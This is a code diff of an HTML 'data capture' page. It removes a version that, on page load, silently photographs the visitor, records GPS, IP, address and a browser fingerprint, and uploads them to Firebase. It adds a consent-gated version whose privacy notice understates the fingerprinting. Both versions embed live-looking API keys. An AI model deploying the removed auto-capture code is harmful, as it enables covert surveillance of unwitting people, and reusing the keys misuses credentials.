@@ -1,399 +1,319 @@
+<!-- capture.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Capture</title>
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: Arial, sans-serif; 
-            background: #f5f5f5; 
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start; /* Align to top for log */
-            align-items: flex-start; /* Align to left for log */
-            min-height: 100vh;
-            padding: 20px;
-        }
-        #status {
-            font-size: 14px;
-            color: #333;
-            white-space: pre-wrap; /* Preserve line breaks */
-        }
-        .error-message {
-            color: red;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Data Capture (Consent Required)</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; max-width: 800px; margin: auto; }
+    .card { background: #f9f9f9; border-radius: 8px; padding: 20px; margin: 15px 0; }
+    button { background: #4CAF50; color: white; border: none; padding: 12px 24px; margin: 5px; cursor: pointer; }
+    button:disabled { background: #ccc; }
+    pre { background: #eee; padding: 10px; border-radius: 4px; overflow: auto; }
+    #status { margin-top: 10px; color: #d32f2f; }
+  </style>
 </head>
 <body>
-    <div id="status">Initializing...</div>
-    <script>
-        // ==================== FIREBASE CONFIGURATION ====================
-        const firebaseConfig = {
-            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
-            authDomain: "esrat-4e28f.firebaseapp.com",
-            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
-            projectId: "esrat-4e28f",
-            storageBucket: "esrat-4e28f.appspot.com",
-            messagingSenderId: "712315598095",
-            appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
+  <h1>📷 Secure Data Capture (User Consent Required)</h1>
+  
+  <div class="card">
+    <h3>ℹ️ Privacy Notice</h3>
+    <p>This tool collects:
+      <ul>
+        <li>Photo (only after you click "📸 Take Photo")</li>
+        <li>Location (only if you grant permission)</li>
+        <li>Device & browser info (non-identifiable unless combined)</li>
+        <li>Network, battery, screen, and timestamp</li>
+      </ul>
+      All data is watermarked and sent to Firebase <strong>only after your explicit consent</strong>.
+    </p>
+    <button id="btnStart">✅ I Consent & Start Capture</button>
+  </div>
+
+  <div id="captureSection" style="display:none;">
+    <div class="card">
+      <h3>1. Capture Photo</h3>
+      <video id="video" width="100%" autoplay playsinline style="display:none;"></video>
+      <canvas id="canvas" style="display:none;"></canvas>
+      <button id="btnGetCamera">📹 Open Camera</button>
+      <button id="btnCapture" disabled>📸 Take Photo</button>
+      <div id="photoPreview"></div>
+    </div>
+
+    <div class="card">
+      <h3>2. Collected Data Preview</h3>
+      <pre id="dataPreview">Click "Capture & Upload" to gather and process data.</pre>
+      <button id="btnCaptureUpload" disabled>📤 Capture & Upload</button>
+      <div id="status"></div>
+    </div>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js"></script>
+
+  <script>
+    // 🔐 Firebase Config (as provided — trimmed extra spaces in databaseURL)
+    const firebaseConfig = {
+      apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
+      authDomain: "esrat-4e28f.firebaseapp.com",
+      databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com", // ← removed trailing space
+      projectId: "esrat-4e28f",
+      storageBucket: "esrat-4e28f.appspot.com",
+      messagingSenderId: "712315598095",
+      appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
+
+    // DOM Elements
+    const btnStart = document.getElementById('btnStart');
+    const captureSection = document.getElementById('captureSection');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const btnGetCamera = document.getElementById('btnGetCamera');
+    const btnCapture = document.getElementById('btnCapture');
+    const photoPreview = document.getElementById('photoPreview');
+    const dataPreview = document.getElementById('dataPreview');
+    const btnCaptureUpload = document.getElementById('btnCaptureUpload');
+    const statusEl = document.getElementById('status');
+
+    let stream = null;
+    let capturedImageBlob = null;
+    let capturedImageDataUrl = null;
+    let collectedData = {};
+
+    // ✅ User consents
+    btnStart.addEventListener('click', () => {
+      btnStart.disabled = true;
+      captureSection.style.display = 'block';
+    });
+
+    // 📹 Get camera
+    btnGetCamera.addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        btnCapture.disabled = false;
+        btnGetCamera.disabled = true;
+      } catch (err) {
+        statusEl.textContent = '	Camera access denied or unavailable: ' + err.message;
+      }
+    });
+
+    // 📸 Capture photo
+    btnCapture.addEventListener('click', () => {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      capturedImageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      capturedImageBlob = dataURLtoBlob(capturedImageDataUrl);
+
+      const img = document.createElement('img');
+      img.src = capturedImageDataUrl;
+      img.style.maxWidth = '100%';
+      photoPreview.innerHTML = '';
+      photoPreview.appendChild(img);
+
+      btnCaptureUpload.disabled = false;
+      video.style.display = 'none';
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    });
+
+    // 📤 Capture full data & upload
+    btnCaptureUpload.addEventListener('click', async () => {
+      statusEl.textContent = 'Collecting data...';
+      try {
+        collectedData = await collectAllData();
+        collectedData.timestamp = new Date().toISOString();
+        collectedData.indianTime = new Date().toLocaleString('en-IN', {
+          timeZone: 'Asia/Kolkata',
+          hour12: true
+        });
+
+        // Watermark photo
+        const watermarkedBlob = await addWatermarkToImage(capturedImageBlob, collectedData);
+        const base64Watermarked = await blobToDataURL(watermarkedBlob);
+
+        // Upload to Firebase Storage
+        const fileName = `capture_${Date.now()}.jpg`;
+        const storageRef = storage.ref('captures/' + fileName);
+        await storageRef.put(watermarkedBlob);
+        const downloadURL = await storageRef.getDownloadURL();
+
+        // Save metadata to Realtime DB
+        const captureId = db.ref('captures').push().key;
+        await db.ref('captures/' + captureId).set({
+          ...collectedData,
+          photoUrl: downloadURL,
+          fileName: fileName,
+          captureId: captureId,
+          uploadTime: firebase.database.ServerValue.TIMESTAMP
+        });
+
+        statusEl.textContent = '✅ Upload successful! Capture ID: ' + captureId;
+        dataPreview.innerHTML = `<strong>Uploaded:</strong> ${fileName}<br><br>` + formatDataForDisplay(collectedData);
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = '❌ Error: ' + (err.message || err);
+      }
+    });
+
+    // 🔍 Collect all allowed data (with fallbacks)
+    async function collectAllData() {
+      const data = {};
+
+      // 📍 Geolocation
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+        });
+        data.latitude = pos.coords.latitude;
+        data.longitude = pos.coords.longitude;
+        data.accuracy = pos.coords.accuracy;
+        data.altitude = pos.coords.altitude;
+        data.speed = pos.coords.speed;
+      } catch (e) {
+        data.geolocationError = e.message;
+      }
+
+      // 📶 Network
+      if ('connection' in navigator) {
+        const nc = navigator.connection;
+        data.network = {
+          type: nc.type || nc.effectiveType,
+          downlink: nc.downlink,
+          rtt: nc.rtt,
+          saveData: nc.saveData
         };
+      }
 
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const storage = firebase.storage();
-        const database = firebase.database();
+      // 🔋 Battery (deprecated but still works in some browsers)
+      try {
+        const battery = await navigator.getBattery();
+        data.battery = {
+          level: battery.level,
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+      } catch (e) {
+        data.batteryError = e.message;
+      }
 
-        // ==================== UTILITY FUNCTIONS ====================
-        
-        // Get Public IP Address
-        async function getPublicIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error fetching public IP:', error);
-                return 'Unknown';
-            }
-        }
+      // 🖥️ Device & Screen
+      data.device = {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        vendor: navigator.vendor,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        cookieEnabled: navigator.cookieEnabled
+      };
 
-        // Get GPS Location
-        function getGPSLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            });
-                        },
-                        (error) => {
-                            console.error('Geolocation error:', error);
-                            resolve({ latitude: null, longitude: null, accuracy: null });
-                        }
-                    );
-                } else {
-                    resolve({ latitude: null, longitude: null, accuracy: null });
-                }
-            });
-        }
+      data.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation?.type || 'unknown'
+      };
 
-        // Get Device Specs
-        function getDeviceSpecs() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0
-            };
-        }
+      // 🌐 Public IP (via external API)
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        data.publicIP = ipData.ip;
+      } catch (e) {
+        data.ipError = e.message;
+      }
 
-        // Get Network Details
-        async function getNetworkDetails() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                return {
-                    effectiveType: connection.effectiveType || 'Unknown',
-                    downlink: connection.downlink || 'Unknown',
-                    rtt: connection.rtt || 'Unknown',
-                    saveData: connection.saveData || false
-                };
-            }
-            return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: false };
-        }
+      // 🧠 Browser Fingerprint (simplified robust hash)
+      data.fingerprint = generateFingerprint();
 
-        // Get Battery Status
-        async function getBatteryStatus() {
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: (battery.level * 100).toFixed(2) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                } else if (navigator.battery) {
-                    const battery = navigator.battery;
-                    return {
-                        level: (battery.level * 100).toFixed(2) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                }
-            } catch (error) {
-                console.error('Battery API error:', error);
-            }
-            return { level: 'Unknown', charging: false, chargingTime: 'Unknown', dischargingTime: 'Unknown' };
-        }
+      return data;
+    }
 
-        // Get Screen Size
-        function getScreenSize() {
-            return {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                pixelDepth: window.screen.pixelDepth,
-                devicePixelRatio: window.devicePixelRatio
-            };
-        }
+    // 🔒 Simple fingerprint (combine stable props)
+    function generateFingerprint() {
+      const components = [
+        navigator.userAgent,
+        navigator.language,
+        screen.width,
+        screen.height,
+        screen.colorDepth,
+        new Date().getTimezoneOffset(),
+        !!window.localStorage,
+        !!window.sessionStorage,
+        navigator.platform,
+        navigator.hardwareConcurrency,
+        navigator.deviceMemory
+      ];
+      return btoa(components.join('|')).substring(0, 20);
+    }
 
-        // Generate Browser Fingerprint
-        async function generateBrowserFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.textBaseline = 'alphabetic';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Browser Fingerprint', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Browser Fingerprint', 4, 17);
-            
-            const canvasData = canvas.toDataURL();
-            const hash = await hashString(canvasData);
-            return hash;
-        }
+    // 🖼️ Add watermark (text overlay on canvas)
+    async function addWatermarkToImage(blob, data) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        img.onload = () => {
+          const c = document.createElement('canvas');
+          c.width = img.width;
+          c.height = img.height;
+          const ctx = c.getContext('2d');
+          ctx.drawImage(img, 0, 0);
 
-        // Hash String Function
-        async function hashString(str) {
-            const encoder = new TextEncoder();
-            const data = encoder.encode(str);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-        }
+          // Watermark style
+          ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+          ctx.fillRect(10, c.height - 120, c.width - 20, 110);
+          ctx.font = '12px Arial';
+          ctx.fillStyle = 'white';
+          ctx.fillText(`Lat: ${data.latitude?.toFixed(6) || '—'}`, 20, c.height - 100);
+          ctx.fillText(`Lng: ${data.longitude?.toFixed(6) || '—'}`, 20, c.height - 85);
+          ctx.fillText(`IP: ${data.publicIP || '—'}`, 20, c.height - 70);
+          ctx.fillText(`Time: ${new Date(data.timestamp).toLocaleString('en-IN')}`, 20, c.height - 55);
+          ctx.fillText(`Dev: ${data.device.platform} | FP: ${data.fingerprint}`, 20, c.height - 40);
 
-        // Get Address from GPS (Reverse Geocoding)
-        async function getAddressFromGPS(latitude, longitude) {
-            try {
-                const apiKey = '6706339e20b94127377139nyudb9267';
-                const response = await fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}&api_key=${apiKey}`);
-                const data = await response.json();
-                return data.address || 'Unknown';
-            } catch (error) {
-                console.error('Reverse geocoding error:', error);
-                return 'Unknown';
-            }
-        }
+          c.toBlob(resolve, 'image/jpeg', 0.8);
+        };
+        img.src = URL.createObjectURL(blob);
+      });
+    }
 
-        // Get Indian Time
-        function getIndianTime() {
-            const options = {
-                timeZone: 'Asia/Kolkata',
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            };
-            return new Date().toLocaleString('en-IN', options);
-        }
+    // 📦 Helpers
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
 
-        // Watermark Photo
-        function watermarkPhoto(imageData, metadata) {
-            return new Promise((resolve) => {
-                const img = new Image();
-                img.onload = function() {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0);
+    function blobToDataURL(blob) {
+      return new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+      });
+    }
 
-                    // Watermark text
-                    ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
-                    ctx.font = 'bold 14px Arial';
-                    ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';
-                    ctx.shadowBlur = 4;
-
-                    let yOffset = 20;
-                    const watermarkData = [
-                        `Time: ${metadata.timestamp}`,
-                        `GPS: ${metadata.gps.latitude?.toFixed(6)}, ${metadata.gps.longitude?.toFixed(6)}`,
-                        `IP: ${metadata.publicIP}`,
-                        `Battery: ${metadata.battery.level}`,
-                        `Network: ${metadata.network.effectiveType}`,
-                        `Screen: ${metadata.screen.width}x${metadata.screen.height}`
-                    ];
-
-                    watermarkData.forEach(text => {
-                        ctx.fillText(text, 10, yOffset);
-                        yOffset += 20;
-                    });
-
-                    canvas.toBlob(resolve, 'image/jpeg', 0.95);
-                };
-                img.src = imageData;
-            });
-        }
-
-        // Capture Photo from Camera
-        async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                
-                // Wait for video to load metadata and play
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-
-                // Wait a moment for the camera to adjust
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                // Stop all tracks to turn off the camera light
-                stream.getTracks().forEach(track => track.stop());
-                
-                return canvas.toDataURL('image/jpeg');
-            } catch (error) {
-                console.error('Camera access error:', error);
-                return null;
-            }
-        }
-
-        // Collect All Data
-        async function collectAllData() {
-            const gps = await getGPSLocation();
-            const publicIP = await getPublicIP();
-            const address = gps.latitude && gps.longitude ? await getAddressFromGPS(gps.latitude, gps.longitude) : 'Unknown';
-            const battery = await getBatteryStatus();
-            const network = await getNetworkDetails();
-            const screen = getScreenSize();
-            const deviceSpecs = getDeviceSpecs();
-            const fingerprint = await generateBrowserFingerprint();
-            const timestamp = getIndianTime();
-
-            return {
-                timestamp,
-                gps,
-                publicIP,
-                address,
-                battery,
-                network,
-                screen,
-                deviceSpecs,
-                fingerprint
-            };
-        }
-
-        // Save Data to Firebase
-        async function saveToFirebase(photoBlob, metadata) {
-            try {
-                const timestamp = new Date().getTime();
-                const photoRef = storage.ref(`photos/${timestamp}.jpg`);
-                await photoRef.put(photoBlob);
-                const photoURL = await photoRef.getDownloadURL();
-
-                const dataRef = database.ref(`captures/${timestamp}`);
-                await dataRef.set({
-                    timestamp: metadata.timestamp,
-                    photoURL,
-                    gps: metadata.gps,
-                    publicIP: metadata.publicIP,
-                    address: metadata.address,
-                    battery: metadata.battery,
-                    network: metadata.network,
-                    screen: metadata.screen,
-                    deviceSpecs: metadata.deviceSpecs,
-                    fingerprint: metadata.fingerprint,
-                    createdAt: new Date().toISOString()
-                });
-
-                console.log('Data saved to Firebase successfully!');
-                alert('Photo and data captured and saved to Firebase!');
-            } catch (error) {
-                console.error('Firebase save error:', error);
-                alert('Error saving to Firebase. Please check your configuration.');
-            }
-        }
-
-        // Update Status (Appends to log)
-        function updateStatus(message, isError = false) {
-            const statusElement = document.getElementById('status');
-            const logEntry = document.createElement('div');
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            if (isError) {
-                logEntry.classList.add('error-message');
-            }
-            statusElement.appendChild(logEntry);
-            console.log(message);
-        }
-
-        // Main Capture Logic
-        async function startCapture() {
-            // Clear initial "Initializing..." message
-            document.getElementById('status').innerHTML = '';
-            updateStatus('Starting automatic data capture...');
-            updateStatus('**IMPORTANT**: If permission prompts do not appear, please click anywhere on the page to provide a user gesture.');
-
-            try {
-                updateStatus('1/3: Requesting Camera and Geolocation permissions...');
-                
-                // Collect all data (this will trigger permission prompts)
-                const metadata = await collectAllData();
-                
-                updateStatus('2/3: Capturing photo and collecting device data...');
-                updateStatus(`- Collected GPS: ${metadata.gps.latitude?.toFixed(4)}, ${metadata.gps.longitude?.toFixed(4)}`);
-
-                // Capture photo
-                const photoData = await capturePhoto();
-                if (photoData) {
-                    // Watermark photo
-                    const watermarkedBlob = await watermarkPhoto(photoData, metadata);
-                    
-                    updateStatus('3/3: Uploading data to Firebase...');
-                    // Save to Firebase
-                    await saveToFirebase(watermarkedBlob, metadata);
-                    
-                    updateStatus('✅ Capture Complete! Data saved to Firebase.', false);
-                } else {
-                    updateStatus('❌ Failed to capture photo. Please ensure camera access is allowed and the page is served over HTTPS.', true);
-                    console.error('Failed to capture photo');
-                }
-            } catch (error) {
-                updateStatus(`❌ An error occurred during capture: ${error.message}. Check console for details.`, true);
-                console.error('Capture error:', error);
-            }
-        }
-
-        // Start on page load
-        window.addEventListener('load', startCapture);
-
-        // Fallback for user gesture requirement
-        document.body.addEventListener('click', () => {
-            if (document.getElementById('status').textContent.includes('IMPORTANT')) {
-                // Re-attempt capture if the user clicks and the process hasn't finished
-                if (!document.getElementById('status').textContent.includes('Capture Complete')) {
-                    startCapture();
-                }
-            }
-        }, { once: true });
-    </script>
+    function formatDataForDisplay(obj) {
+      return JSON.stringify(obj, null, 2)
+        .replace(/ /g, '&nbsp;')
+        .replace(/\n/g, '<br>');
+    }
+  </script>
 </body>
 </html>
